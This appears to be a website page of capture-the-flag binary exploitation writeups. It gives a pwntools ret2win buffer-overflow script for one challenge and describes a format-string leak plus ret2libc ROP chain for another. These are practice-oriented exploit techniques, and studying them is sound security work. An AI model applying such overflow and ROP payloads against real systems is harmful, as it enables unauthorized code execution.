---
layout: page
title: Binary Exploitation (Pwn)
subtitle: CTF pwn challenge writeups by event and year
permalink: /ctf/challenges/pwn/
---

<p class="page-lead">Binary exploitation writeups from Google CTF, DEF CON, picoCTF, HackTheBox CTF, and more. Organized by year and event.</p>

<div class="challenge-year-nav">
  <button class="mf-btn active" data-filter="all">All Years</button>
  <button class="mf-btn" data-filter="2025">2025</button>
  <button class="mf-btn" data-filter="2024">2024</button>
</div>

---

## 2025 Challenges

### Google CTF 2025

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2025" data-event="google">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge google">Google CTF 2025</span>
        <h4 class="cc-name">RET2WIN</h4>
      </div>
      <span class="cc-diff easy">Easy</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Pwn · <strong>Points</strong>: 120 · <strong>Solves</strong>: 654</p>
      <p class="cc-desc">Basic x64 stack buffer overflow. Overwrite the saved return address (RIP) on the stack to jump to a hidden `win()` function that prints the flag.</p>
      <div class="cc-tags"><span>Stack Overflow</span><span>Buffer Overflow</span><span>x84_64</span><span>ret2win</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <p>1. Analyze binary in GHIDRA: Locate target function <code>win()</code> at address <code>0x00401156</code>.</p>
          <p>2. Find buffer size: The vulnerable <code>gets(buffer)</code> fills a 64-byte array. The offset to the saved RIP is 72 bytes (64 bytes buffer + 8 bytes saved RBP).</p>
          <p>3. Build python exploit using pwntools:</p>
          <pre><code>from pwn import *

target = process('./ret2win')
win_addr = 0x00401156

payload = b"A" * 72 + p64(win_addr)
target.sendline(payload)
target.interactive()</code></pre>
        </div>
      </details>
    </div>
  </div>

</div>

### HTB Cyber Apocalypse 2025

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2025" data-event="htb">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge htb">HTB Cyber Apocalypse 2025</span>
        <h4 class="cc-name">Chatbot</h4>
      </div>
      <span class="cc-diff medium">Medium</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Pwn · <strong>Points</strong>: 280 · <strong>Solves</strong>: 145</p>
      <p class="cc-desc">A console chatbot vulnerable to format strings and stack overflows. Leak stack values (canary & libc addresses) via format string, then trigger stack overflow to perform a ret2libc payload.</p>
      <div class="cc-tags"><span>Format String</span><span>Stack Canary Bypass</span><span>ret2libc</span><span>ASLR Bypass</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <p>1. Format string leak: Inject <code>%11$p.%15$p</code> to leak stack canary and <code>__libc_start_main_ret</code> address.</p>
          <p>2. Calculate libc base and offset to <code>system()</code> and <code>/bin/sh</code>.</p>
          <p>3. Send stack overflow payload: Fill buffer, place leaked canary, overwrite RBP, and write ROP chain (<code>pop rdi; pop rsi; system</code>) pointing to <code>/bin/sh</code>.</p>
        </div>
      </details>
    </div>
  </div>

</div>
